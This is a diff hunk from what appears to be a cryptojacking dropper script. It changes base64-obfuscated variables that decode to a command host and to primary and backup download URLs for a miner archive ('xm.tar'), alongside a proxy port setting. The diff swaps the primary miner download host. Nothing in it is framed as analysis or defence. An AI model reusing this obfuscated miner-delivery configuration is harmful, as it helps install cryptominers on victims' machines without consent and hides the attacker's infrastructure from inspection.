@@ -2,7 +2,7 @@
 #variables
 domain=$(echo c29sc2Nhbi5saXZlCg==|base64 -d)
 mainurl=$(echo aHR0cDovL3NvbHNjYW4ubGl2ZS9iMmY2MjgK|base64 -d)
-miner_url=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9tL3htLnRhcgo=|base64 -d)
+miner_url=$(echo aHR0cDovL3NvbHNjYW4ubGl2ZS9iMmY2MjgvbS94bS50YXIK|base64 -d)
 miner_url_backup=$(echo aHR0cDovL3NvbHNjYW4ubGl2ZS9iMmY2MjgvbS94bS50YXIK|base64 -d)
 proxyport=1414
 #mv command
